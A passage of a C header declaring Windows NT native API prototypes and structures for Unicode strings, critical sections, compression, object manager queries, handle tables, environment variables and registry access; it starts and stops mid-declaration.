Entry\r\n    )\r\n{\r\n    PLIST_ENTRY Blink;\r\n    PLIST_ENTRY Flink;\r\n\r\n    Flink = Entry->Flink;\r\n    Blink = Entry->Blink;\r\n    Blink->Flink = Flink;\r\n    Flink->Blink = Blink;\r\n    return (BOOLEAN)(Flink == Blink);\r\n}\r\n#endif  // #if !defined(_WDMDDK_) && !defined(_LIST_ENTRY_MACROS_DEFINED_)\r\n\r\n//-----------------------------------------------------------------------------\r\n// Unicode string functions\r\n\r\nNTSYSAPI\r\nBOOLEAN\r\nNTAPI\r\nRtlCreateUnicodeString(\r\n    OUT PUNICODE_STRING DestinationString,\r\n    IN PCWSTR SourceString\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nBOOLEAN\r\nNTAPI\r\nRtlCreateUnicodeStringFromAsciiz(\r\n    OUT PUNICODE_STRING Destination,\r\n    IN PCSTR Source\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nBOOLEAN\r\nNTAPI\r\nRtlPrefixUnicodeString (\r\n    IN PUNICODE_STRING String1,\r\n    IN PUNICODE_STRING String2,\r\n    IN BOOLEAN CaseInSensitive\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlDuplicateUnicodeString(\r\n    IN  BOOLEAN AllocateNew,\r\n    IN  PUNICODE_STRING SourceString,\r\n    OUT PUNICODE_STRING TargetString\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlAppendUnicodeToString (\r\n    PUNICODE_STRING Destination,\r\n    PCWSTR Source\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlAppendUnicodeStringToString(\r\n    IN OUT PUNICODE_STRING Destination,\r\n    IN PUNICODE_STRING Source\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlUnicodeStringToInteger (\r\n    IN PUNICODE_STRING String,\r\n    IN ULONG Base OPTIONAL,\r\n    OUT PULONG Value\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlIntegerToUnicodeString (\r\n    IN ULONG Value,\r\n    IN ULONG Base OPTIONAL,\r\n    IN OUT PUNICODE_STRING String\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS \r\nNTAPI\r\nRtlGUIDFromString( \r\n    IN PUNICODE_STRING GuidString, \r\n    OUT GUID *Guid \r\n    );\r\n\r\n\r\nNTSYSAPI\r\nLONG\r\nNTAPI\r\nRtlCompareUnicodeString (\r\n    IN PUNICODE_STRING String1,\r\n    IN PUNICODE_STRING String2,\r\n    IN BOOLEAN CaseInSensitive\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nVOID\r\nNTAPI\r\nRtlCopyUnicodeString(\r\n    OUT PUNICODE_STRING DestinationString,\r\n    IN PUNICODE_STRING SourceString\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlUpcaseUnicodeString (\r\n    OUT PUNICODE_STRING DestinationString,\r\n    IN PUNICODE_STRING SourceString,\r\n    IN BOOLEAN AllocateDestinationString\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlDowncaseUnicodeString (\r\n    OUT PUNICODE_STRING DestinationString,\r\n    IN PUNICODE_STRING SourceString,\r\n    IN BOOLEAN AllocateDestinationString\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nBOOLEAN\r\nNTAPI\r\nRtlEqualUnicodeString (\r\n    IN PUNICODE_STRING String1,\r\n    IN PUNICODE_STRING String2,\r\n    IN BOOLEAN CaseInSensitive\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlFormatCurrentUserKeyPath(\r\n    OUT PUNICODE_STRING CurrentUserKeyPath\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nVOID\r\nNTAPI\r\nRtlRaiseStatus (\r\n    IN NTSTATUS Status\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nVOID\r\nNTAPI\r\nDbgBreakPoint(\r\n    VOID\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nULONG\r\n_cdecl\r\nDbgPrint (\r\n    PCH Format,\r\n    ...\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nULONG\r\nNTAPI\r\nRtlRandom(\r\n    IN OUT PULONG Seed\r\n    ); \r\n\r\n//-----------------------------------------------------------------------------\r\n// Critical section functions\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlInitializeCriticalSection(\r\n    IN  PRTL_CRITICAL_SECTION CriticalSection\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nBOOL\r\nNTAPI\r\nRtlTryEnterCriticalSection(\r\n    IN PRTL_CRITICAL_SECTION CriticalSection\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlEnterCriticalSection(\r\n    IN PRTL_CRITICAL_SECTION CriticalSection\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlLeaveCriticalSection(\r\n    IN PRTL_CRITICAL_SECTION CriticalSection\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlDeleteCriticalSection(\r\n    IN  PRTL_CRITICAL_SECTION CriticalSection\r\n    );\r\n\r\n//-----------------------------------------------------------------------------\r\n// Compression and decompression\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlCompressBuffer(\r\n    IN  USHORT CompressionFormatAndEngine,\r\n    IN  PUCHAR UncompressedBuffer,\r\n    IN  ULONG UncompressedBufferSize,\r\n    OUT PUCHAR CompressedBuffer,\r\n    IN  ULONG CompressedBufferSize,\r\n    IN  ULONG UncompressedChunkSize,\r\n    OUT PULONG FinalCompressedSize,\r\n    IN  PVOID WorkSpace\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlDecompressBuffer(\r\n    IN  USHORT CompressionFormat,\r\n    OUT PUCHAR UncompressedBuffer,\r\n    IN  ULONG UncompressedBufferSize,\r\n    IN  PUCHAR CompressedBuffer,\r\n    IN  ULONG CompressedBufferSize,\r\n    OUT PULONG FinalUncompressedSize \r\n    );\r\n\r\n//-----------------------------------------------------------------------------\r\n// Object functions\r\n\r\n//\r\n// Object Manager Directory Specific Access Rights.\r\n//\r\n\r\n#ifndef DIRECTORY_QUERY\r\n#define DIRECTORY_QUERY                 (0x0001)\r\n#define DIRECTORY_TRAVERSE              (0x0002)\r\n#define DIRECTORY_CREATE_OBJECT         (0x0004)\r\n#define DIRECTORY_CREATE_SUBDIRECTORY   (0x0008)\r\n#define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0xF)\r\n#endif\r\n\r\ntypedef enum _POOL_TYPE {\r\n    NonPagedPool,\r\n    PagedPool,\r\n    NonPagedPoolMustSucceed,\r\n    DontUseThisType,\r\n    NonPagedPoolCacheAligned,\r\n    PagedPoolCacheAligned,\r\n    NonPagedPoolCacheAlignedMustS,\r\n    MaxPoolType\r\n} POOL_TYPE;\r\n\r\n//\r\n// NtQueryObject uses ObjectBasicInformation\r\n//\r\n\r\ntypedef struct _OBJECT_BASIC_INFORMATION {\r\n    ULONG Attributes;\r\n    ACCESS_MASK GrantedAccess;\r\n    ULONG HandleCount;\r\n    ULONG PointerCount;\r\n    ULONG PagedPoolCharge;\r\n    ULONG NonPagedPoolCharge;\r\n    ULONG Reserved[3];\r\n    ULONG NameInfoSize;\r\n    ULONG TypeInfoSize;\r\n    ULONG SecurityDescriptorSize;\r\n    LARGE_INTEGER CreationTime;\r\n} OBJECT_BASIC_INFORMATION, *POBJECT_BASIC_INFORMATION;\r\n\r\n//\r\n// NtQueryObject uses ObjectNameInformation\r\n//\r\n\r\ntypedef struct _OBJECT_NAME_INFORMATION {\r\n    UNICODE_STRING Name;\r\n} OBJECT_NAME_INFORMATION, *POBJECT_NAME_INFORMATION;\r\n\r\n//\r\n// NtQueryObject uses ObjectTypeInformation\r\n//\r\n\r\ntypedef struct _OBJECT_TYPE_INFORMATION {\r\n   UNICODE_STRING TypeName;\r\n   ULONG TotalNumberOfObjects;\r\n   ULONG TotalNumberOfHandles;\r\n   ULONG TotalPagedPoolUsage;\r\n   ULONG TotalNonPagedPoolUsage;\r\n   ULONG TotalNamePoolUsage;\r\n   ULONG TotalHandleTableUsage;\r\n   ULONG HighWaterNumberOfObjects;\r\n   ULONG HighWaterNumberOfHandles;\r\n   ULONG HighWaterPagedPoolUsage;\r\n   ULONG HighWaterNonPagedPoolUsage;\r\n   ULONG HighWaterNamePoolUsage;\r\n   ULONG HighWaterHandleTableUsage;\r\n   ULONG InvalidAttributes;\r\n   GENERIC_MAPPING GenericMapping;\r\n   ULONG ValidAccessMask;\r\n   BOOLEAN SecurityRequired;\r\n   BOOLEAN MaintainHandleCount;\r\n   POOL_TYPE PoolType;\r\n   ULONG DefaultPagedPoolCharge;\r\n   ULONG DefaultNonPagedPoolCharge;\r\n} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;\r\n\r\n//\r\n// NtQueryObject uses ObjectHandleFlagInformation\r\n// NtSetInformationObject uses ObjectHandleFlagInformation\r\n//\r\n\r\ntypedef struct _OBJECT_HANDLE_FLAG_INFORMATION {\r\n    BOOLEAN Inherit;\r\n    BOOLEAN ProtectFromClose;\r\n} OBJECT_HANDLE_FLAG_INFORMATION, *POBJECT_HANDLE_FLAG_INFORMATION;\r\n\r\n//\r\n// NtQueryDirectoryObject uses this type\r\n//\r\n\r\ntypedef struct _OBJECT_DIRECTORY_INFORMATION {\r\n    UNICODE_STRING Name;\r\n    UNICODE_STRING TypeName;\r\n} OBJECT_DIRECTORY_INFORMATION, *POBJECT_DIRECTORY_INFORMATION;\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtOpenDirectoryObject(\r\n    OUT PHANDLE DirectoryHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtQueryDirectoryObject(\r\n    IN HANDLE DirectoryHandle,\r\n    OUT PVOID Buffer,\r\n    IN ULONG Length,\r\n    IN BOOLEAN ReturnSingleEntry,\r\n    IN BOOLEAN RestartScan,\r\n    IN OUT PULONG Context,\r\n    OUT PULONG ReturnLength OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtSetInformationObject (\r\n    IN HANDLE ObjectHandle,\r\n    IN OBJECT_INFORMATION_CLASS ObjectInformationClass,\r\n    IN PVOID ObjectInformation,\r\n    IN ULONG Length\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtDuplicateObject (\r\n    IN HANDLE SourceProcessHandle,\r\n    IN HANDLE SourceHandle,\r\n    IN HANDLE TargetProcessHandle OPTIONAL,\r\n    OUT PHANDLE TargetHandle OPTIONAL,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN ULONG HandleAttributes,\r\n    IN ULONG Options\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtQuerySecurityObject (\r\n    IN HANDLE ObjectHandle,\r\n    IN SECURITY_INFORMATION SecurityInformation,\r\n    OUT PSECURITY_DESCRIPTOR SecurityDescriptor,\r\n    IN ULONG DescriptorLength,\r\n    OUT PULONG ReturnLength\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwQuerySecurityObject (\r\n    IN HANDLE ObjectHandle,\r\n    IN SECURITY_INFORMATION SecurityInformation,\r\n    OUT PSECURITY_DESCRIPTOR SecurityDescriptor,\r\n    IN ULONG DescriptorLength,\r\n    OUT PULONG ReturnLength\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtSetSecurityObject (\r\n    IN HANDLE ObjectHandle,\r\n    IN SECURITY_INFORMATION SecurityInformation,\r\n    IN PSECURITY_DESCRIPTOR SecurityDescriptor\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwSetSecurityObject (\r\n    IN HANDLE ObjectHandle,\r\n    IN SECURITY_INFORMATION SecurityInformation,\r\n    IN PSECURITY_DESCRIPTOR SecurityDescriptor\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtMakeTemporaryObject(\r\n    IN HANDLE ObjectHandle\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwMakeTemporaryObject(\r\n    IN HANDLE ObjectHandle\r\n    );\r\n\r\n//-----------------------------------------------------------------------------\r\n// Handle table RTL functions\r\n\r\n#define LEVEL_HANDLE_ID         0x74000000\r\n#define LEVEL_HANDLE_ID_MASK    0xFF000000\r\n#define LEVEL_HANDLE_INDEX_MASK 0x00FFFFFF\r\n\r\ntypedef enum _RTL_GENERIC_COMPARE_RESULTS {\r\n    GenericLessThan,\r\n    GenericGreaterThan,\r\n    GenericEqual\r\n} RTL_GENERIC_COMPARE_RESULTS;\r\n\r\n\r\ntypedef struct _RTL_SPLAY_LINKS\r\n{\r\n  struct _RTL_SPLAY_LINKS *Parent;\r\n  struct _RTL_SPLAY_LINKS *LeftChild;\r\n  struct _RTL_SPLAY_LINKS *RightChild;\r\n} RTL_SPLAY_LINKS, *PRTL_SPLAY_LINKS;\r\n\r\n\r\nstruct _RTL_GENERIC_TABLE;\r\n\r\ntypedef\r\nRTL_GENERIC_COMPARE_RESULTS\r\n(NTAPI * PRTL_GENERIC_COMPARE_ROUTINE) (\r\n    struct _RTL_GENERIC_TABLE *Table,\r\n    PVOID FirstStruct,\r\n    PVOID SecondStruct\r\n    );\r\n\r\ntypedef\r\nPVOID\r\n(NTAPI *PRTL_GENERIC_ALLOCATE_ROUTINE) (\r\n    struct _RTL_GENERIC_TABLE *Table,\r\n    ULONG ByteSize\r\n    );\r\n\r\ntypedef\r\nVOID\r\n(NTAPI *PRTL_GENERIC_FREE_ROUTINE) (\r\n    struct _RTL_GENERIC_TABLE *Table,\r\n    PVOID Buffer\r\n    );\r\n\r\n\r\ntypedef struct _RTL_GENERIC_TABLE {\r\n    PRTL_SPLAY_LINKS TableRoot;\r\n    LIST_ENTRY InsertOrderList;\r\n    PLIST_ENTRY OrderedPointer;\r\n    ULONG WhichOrderedElement;\r\n    ULONG NumberGenericTableElements;\r\n    PRTL_GENERIC_COMPARE_ROUTINE CompareRoutine;\r\n    PRTL_GENERIC_ALLOCATE_ROUTINE AllocateRoutine;\r\n    PRTL_GENERIC_FREE_ROUTINE FreeRoutine;\r\n    PVOID TableContext;\r\n} RTL_GENERIC_TABLE, *PRTL_GENERIC_TABLE;\r\n\r\n\r\ntypedef struct _RTL_HANDLE_TABLE_ENTRY\r\n{\r\n   struct _RTL_HANDLE_TABLE_ENTRY *Next;    /* pointer to next free handle */\r\n   PVOID  Object;\r\n\r\n} RTL_HANDLE_TABLE_ENTRY, *PRTL_HANDLE_TABLE_ENTRY;\r\n\r\n\r\ntypedef struct _RTL_HANDLE_TABLE\r\n{\r\n   ULONG MaximumNumberOfHandles;\r\n   ULONG SizeOfHandleTableEntry;\r\n   ULONG Unknown01;\r\n   ULONG Unknown02;\r\n   PRTL_HANDLE_TABLE_ENTRY FreeHandles;\r\n   PRTL_HANDLE_TABLE_ENTRY CommittedHandles;\r\n   PRTL_HANDLE_TABLE_ENTRY UnCommittedHandles;\r\n   PRTL_HANDLE_TABLE_ENTRY MaxReservedHandles;\r\n} RTL_HANDLE_TABLE, *PRTL_HANDLE_TABLE;\r\n\r\n\r\nNTSYSAPI\r\nVOID\r\nNTAPI\r\nRtlInitializeGenericTable (\r\n    IN PRTL_GENERIC_TABLE Table,\r\n    IN PRTL_GENERIC_COMPARE_ROUTINE CompareRoutine,\r\n    IN PRTL_GENERIC_ALLOCATE_ROUTINE AllocateRoutine,\r\n    IN PRTL_GENERIC_FREE_ROUTINE FreeRoutine,\r\n    IN PVOID TableContext\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nVOID\r\nNTAPI\r\nRtlInitializeHandleTable(\r\n    IN ULONG MaximumNumberOfHandles,\r\n    IN ULONG SizeOfHandleTableEntry,\r\n    OUT PRTL_HANDLE_TABLE HandleTable\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nPRTL_HANDLE_TABLE_ENTRY\r\nNTAPI\r\nRtlAllocateHandle(\r\n    IN PRTL_HANDLE_TABLE HandleTable,\r\n    OUT PULONG HandleIndex OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nBOOLEAN\r\nNTAPI\r\nRtlFreeHandle(\r\n    IN PRTL_HANDLE_TABLE HandleTable,\r\n    IN PRTL_HANDLE_TABLE_ENTRY Handle\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nBOOLEAN\r\nNTAPI\r\nRtlIsValidIndexHandle(\r\n    IN PRTL_HANDLE_TABLE HandleTable,\r\n    IN ULONG HandleIndex,\r\n    OUT PRTL_HANDLE_TABLE_ENTRY *Handle\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nPVOID\r\nNTAPI\r\nRtlInsertElementGenericTable (\r\n    IN PRTL_GENERIC_TABLE Table,\r\n    IN PVOID Buffer,\r\n    IN LONG BufferSize,\r\n    OUT PBOOLEAN NewElement OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nBOOLEAN\r\nNTAPI\r\nRtlIsGenericTableEmpty (\r\n    IN PRTL_GENERIC_TABLE Table\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nBOOLEAN\r\nNTAPI\r\nRtlIsGenericTableEmpty (\r\n    IN PRTL_GENERIC_TABLE Table\r\n    );\r\n \r\n\r\nNTSYSAPI\r\nPVOID\r\nNTAPI\r\nRtlLookupElementGenericTable (\r\n    IN PRTL_GENERIC_TABLE Table,\r\n    IN PVOID Buffer\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nPVOID\r\nNTAPI\r\nRtlEnumerateGenericTableWithoutSplaying(\r\n    IN  PRTL_GENERIC_TABLE Table,\r\n    IN  PVOID *RestartKey\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwClose(\r\n    IN  HANDLE Handle\r\n    );\r\n\r\n//-----------------------------------------------------------------------------\r\n// Environment functions\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlOpenCurrentUser(\r\n    IN ULONG DesiredAccess,\r\n    OUT PHANDLE CurrentUserKey\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlCreateEnvironment(\r\n    BOOLEAN CloneCurrentEnvironment,\r\n    PVOID *Environment\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlQueryEnvironmentVariable_U (\r\n    PVOID Environment,\r\n    PUNICODE_STRING Name,\r\n    PUNICODE_STRING Value\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlSetEnvironmentVariable(\r\n    PVOID *Environment,\r\n    PUNICODE_STRING Name,\r\n    PUNICODE_STRING Value\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlDestroyEnvironment(\r\n    PVOID Environment\r\n    );\r\n\r\n//-----------------------------------------------------------------------------\r\n// Registry functions\r\n\r\n\r\ntypedef enum _KEY_INFORMATION_CLASS\r\n{\r\n    KeyBasicInformation,                    // 0x00\r\n    KeyNodeInformation,                     // 0x01\r\n    KeyFullInformation,                     // 0x02\r\n    KeyNameInformation,                     // 0x03\r\n    KeyCachedInformation,                   // 0x04\r\n    KeyFlagsInformation,                    // 0x05\r\n    MaxKeyInfoClass                         // MaxKeyInfoClass should always be the last enum\r\n\r\n} KEY_INFORMATION_CLASS;\r\n\r\n//\r\n// Key query structures\r\n//\r\n\r\ntypedef struct _KEY_BASIC_INFORMATION\r\n{\r\n    LARGE_INTEGER LastWriteTime;\r\n    ULONG   TitleIndex;\r\n    ULONG   NameLength;\r\n    WCHAR   Name[1];            // Variable length string\r\n\r\n} KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;\r\n\r\n\r\ntypedef struct _KEY_NODE_INFORMATION\r\n{\r\n    LARGE_INTEGER LastWriteTime;\r\n    ULONG   TitleIndex;\r\n    ULONG   ClassOffset;\r\n    ULONG   ClassLength;\r\n    ULONG   NameLength;\r\n    WCHAR   Name[1];            // Variable length string\r\n//          Class[1];           // Variable length string not declared\r\n} KEY_NODE_INFORMATION, *PKEY_NODE_INFORMATION;\r\n\r\n\r\ntypedef struct _KEY_FULL_INFORMATION\r\n{\r\n    LARGE_INTEGER LastWriteTime;\r\n    ULONG   TitleIndex;\r\n    ULONG   ClassOffset;\r\n    ULONG   ClassLength;\r\n    ULONG   SubKeys;\r\n    ULONG   MaxNameLen;\r\n    ULONG   MaxClassLen;\r\n    ULONG   Values;\r\n    ULONG   MaxValueNameLen;\r\n    ULONG   MaxValueDataLen;\r\n    WCHAR   Class[1];           // Variable length\r\n\r\n} KEY_FULL_INFORMATION, *PKEY_FULL_INFORMATION;\r\n\r\n\r\n// end_wdm\r\ntypedef struct _KEY_NAME_INFORMATION\r\n{\r\n    ULONG   NameLength;\r\n    WCHAR   Name[1];            // Variable length string\r\n\r\n} KEY_NAME_INFORMATION, *PKEY_NAME_INFORMATION;\r\n\r\ntypedef struct _KEY_CACHED_INFORMATION\r\n{\r\n    LARGE_INTEGER LastWriteTime;\r\n    ULONG   TitleIndex;\r\n    ULONG   SubKeys;\r\n    ULONG   MaxNameLen;\r\n    ULONG   Values;\r\n    ULONG   MaxValueNameLen;\r\n    ULONG   MaxValueDataLen;\r\n    ULONG   NameLength;\r\n    WCHAR   Name[1];            // Variable length string\r\n\r\n} KEY_CACHED_INFORMATION, *PKEY_CACHED_INFORMATION;\r\n\r\n\r\ntypedef struct _KEY_FLAGS_INFORMATION\r\n{\r\n    ULONG   UserFlags;\r\n\r\n} KEY_FLAGS_INFORMATION, *PKEY_FLAGS_INFORMATION;\r\n\r\n\r\n\r\ntypedef enum _KEY_VALUE_INFORMATION_CLASS {\r\n    KeyValueBasicInformation,               // 0x00\r\n    KeyValueFullInformation,                // 0x01\r\n    KeyValuePartialInformation,             // 0x02\r\n    KeyValueFullInformationAlign64,         // 0x03\r\n    KeyValuePartialInformationAlign64,      // 0x04\r\n    MaxKeyValueInfoClass                    // MaxKeyValueInfoClass should always be the last enum\r\n} KEY_VALUE_INFORMATION_CLASS;\r\n\r\ntypedef struct _KEY_VALUE_BASIC_INFORMATION\r\n{\r\n    ULONG TitleIndex;\r\n    ULONG Type;\r\n    ULONG NameLength;\r\n    WCHAR Name[1];  //  Variable size\r\n} KEY_VALUE_BASIC_INFORMATION, *PKEY_VALUE_BASIC_INFORMATION;\r\n\r\ntypedef struct _KEY_VALUE_FULL_INFORMATION \r\n{\r\n    ULONG TitleIndex;\r\n    ULONG Type;\r\n    ULONG DataOffset;\r\n    ULONG DataLength;\r\n    ULONG NameLength;\r\n    WCHAR Name[1];            // Variable size\r\n//        Data[1];            // Variable size data not declared\r\n} KEY_VALUE_FULL_INFORMATION, *PKEY_VALUE_FULL_INFORMATION;\r\n\r\n\r\ntypedef struct _KEY_VALUE_PARTIAL_INFORMATION {\r\n    ULONG   TitleIndex;\r\n    ULONG   Type;\r\n    ULONG   DataLength;\r\n    UCHAR   Data[1];            // Variable size\r\n} KEY_VALUE_PARTIAL_INFORMATION, *PKEY_VALUE_PARTIAL_INFORMATION;\r\n\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtCreateKey(\r\n    OUT PHANDLE KeyHandle,\r\n    IN  ACCESS_MASK DesiredAccess,\r\n    IN  POBJECT_ATTRIBUTES ObjectAttributes,\r\n    IN  ULONG TitleIndex,\r\n    IN  PUNICODE_STRING Class OPTIONAL,\r\n    IN  ULONG CreateOptions,\r\n    OUT PULONG Disposition OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtOpenKey(\r\n    OUT PHANDLE KeyHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtEnumerateKey(\r\n    IN HANDLE KeyHandle,\r\n    IN ULONG Index,\r\n    IN KEY_INFORMATION_CLASS KeyInformationClass,\r\n    IN PVOID KeyInformation,\r\n    IN ULONG Length,\r\n    IN PULONG ResultLength\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwEnumerateKey(\r\n    IN HANDLE KeyHandle,\r\n    IN ULONG Index,\r\n    IN KEY_INFORMATION_CLASS KeyInformationClass,\r\n    IN PVOID KeyInformation,\r\n    IN ULONG Length,\r\n    IN PULONG ResultLength\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtEnumerateValueKey(\r\n    IN HANDLE KeyHandle,\r\n    IN ULONG Index,\r\n    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,\r\n    OUT PVOID  KeyValueInformation,\r\n    IN  ULONG  Length,\r\n    OUT PULONG  ResultLength\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwEnumerateValueKey(\r\n    IN HANDLE KeyHandle,\r\n    IN ULONG Index,\r\n    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,\r\n    OUT PVOID  KeyValueInformation,\r\n    IN  ULONG  Length,\r\n    OUT PULONG  ResultLength\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtDeleteKey(\r\n    IN HANDLE KeyHandle\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtQueryKey(\r\n    IN  HANDLE KeyHandle,\r\n    IN  KEY_INFORMATION_CLASS KeyInformationClass,\r\n    OUT PVOID KeyInformation OPTIONAL,\r\n    IN  ULONG Length,\r\n    OUT PULONG ResultLength    \r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtQueryValueKey(\r\n    IN HANDLE KeyHandle,\r\n    IN PUNICODE_STRING ValueName,\r\n    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,\r\n    OUT PVOID KeyValueInformation,\r\n    IN ULONG Length,\r\n    OUT PULONG ResultLength\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtSetValueKey(\r\n    IN HANDLE KeyHandle,\r\n    IN PUNICODE_STRING ValueName,\r\n    IN ULONG TitleIndex OPTIONAL,\r\n    IN ULONG Type,\r\n    IN PVOID Data,\r\n    IN ULONG DataSize\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtDeleteValueKey(\r\n    IN HANDLE KeyHandle,\r\n    IN PUNICODE_STRING ValueName\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtFlushKey(\r\n    IN HANDLE KeyHandle\r\n    );\r\n\r\n//-----------------------------------------------------------------------------\r\n// RtlQueryRegistryValues\r\n\r\n//\r\n// The following flags specify how the Name field of a RTL_QUERY_REGISTRY_TABLE\r\n// entry is interpreted.  A NULL name indicates the end of the table.\r\n//\r\n\r\n#define RTL_QUERY_REGISTRY_SUBKEY   0x00000001  // Name is a subkey and remainder of\r\n                                                // table or until next subkey are value\r\n                                                // names for that subkey to look at.\r\n\r\n#define RTL_QUERY_REGISTRY_TOPKEY   0x00000002  // Reset current key to original key for\r\n                                                // this and all following table entries.\r\n\r\n#define RTL_QUERY_REGISTRY_REQUIRED 0x00000004  // Fail if no match found for this table\r\n                                                // entry.\r\n\r\n#define RTL_QUERY_REGISTRY_NOVALUE  0x00000008  // Used to mark a table entry that has no\r\n                                                // value name, just wants a call out, not\r\n                                                // an enumeration of all values.\r\n\r\n#define RTL_QUERY_REGISTRY_NOEXPAND 0x00000010  // Used to suppress the expansion of\r\n                                                // REG_MULTI_SZ into multiple callouts or\r\n                                                // to prevent the expansion of environment\r\n                                                // variable values in REG_EXPAND_SZ\r\n\r\n#define RTL_QUERY_REGISTRY_DIRECT   0x00000020  // QueryRoutine field ignored.  EntryContext\r\n                                                // field points to location to store value.\r\n                                                // For null terminated strings, EntryContext\r\n                                                // points to UNICODE_STRING structure that\r\n                                                // that describes maximum size of buffer.\r\n                                                // If .Buffer field is NULL then a buffer is\r\n                                                // allocated.\r\n                                                //\r\n\r\n#define RTL_QUERY_REGISTRY_DELETE   0x00000040  // Used to delete value keys after they\r\n                                                // are queried.\r\n\r\n\r\n//\r\n// The following values for the RelativeTo parameter determine what the\r\n// Path parameter to RtlQueryRegistryValues is relative to.\r\n//\r\n\r\n#define RTL_REGISTRY_ABSOLUTE     0             // Path is a full path\r\n#define RTL_REGISTRY_SERVICES     1             // \\Registry\\Machine\\System\\CurrentControlSet\\Services\r\n#define RTL_REGISTRY_CONTROL      2             // \\Registry\\Machine\\System\\CurrentControlSet\\Control\r\n#define RTL_REGISTRY_WINDOWS_NT   3             // \\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\r\n#define 